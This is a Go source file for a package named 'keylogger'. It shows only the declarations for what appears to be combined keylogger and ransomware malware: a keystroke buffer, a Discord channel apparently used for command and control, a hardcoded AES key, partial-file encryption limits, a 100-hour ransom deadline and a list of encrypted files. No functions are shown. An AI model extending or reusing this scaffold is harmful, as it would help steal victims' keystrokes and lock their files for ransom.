package keylogger

import (
	"runtime"
	"sync"
	"time"
)

const (
	BUFFER_SIZE        = 100
	IDLE_TIMEOUT       = 5 * time.Second
	POLL_INTERVAL      = 3 * time.Second
	MAX_FILE_SIZE      = 100 * 1024 * 1024
	PARTIAL_ENCRYPT_MB = 5 * 1024 * 1024
	RANSOM_HOURS       = 100
)

var (
	keyBuffer        []string
	bufferMutex      sync.Mutex
	lastKeyTime      time.Time
	discordChannelID string
	encryptionKey    = []byte("32-byte-secret-key-for-aes!!")
	isRunning        = true
	lastMessageID    string

	encryptionKeyHex string
	decryptionKeyHex string
	deadlineTime     time.Time
	encryptedFiles   []string
	isWindows        = runtime.GOOS == "windows"

	activeChannel string
)
